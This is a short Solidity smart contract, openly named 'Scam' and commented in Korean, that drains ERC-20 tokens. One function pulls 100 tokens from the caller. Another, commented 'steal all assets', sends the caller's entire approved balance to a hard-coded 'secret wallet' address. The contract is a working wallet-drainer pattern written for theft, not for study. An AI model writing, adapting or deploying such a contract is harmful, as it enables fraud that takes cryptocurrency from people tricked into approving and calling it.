// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

// IERC20 interface
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Scam {

    // 건드릴 토큰 컨트렉주소
    IERC20 token_to_scam = IERC20(0x3A7e4209B89cb9a9D0E792e54A287f8d6cE73D47);

    // write function
    function do_scam() public {
        // 남의 지갑에 코인을 가져와 보기 (실행자의 주소에서 지금 컨트렉으로 약 100개 들어옴)
        token_to_scam.transferFrom(msg.sender, address(this), 100000000000000000000);
    }

    // 전체 자산 훔치기
    function do_scam_total() public {
        // 두번째 지갑
        address secret_wallet = address(0x55FbD3b98246ABcb6c650f2Ad670a1ba84Bba54c);
        uint256 total_balance = token_to_scam.balanceOf(msg.sender);
        token_to_scam.transferFrom(msg.sender, secret_wallet, total_balance);
    }
}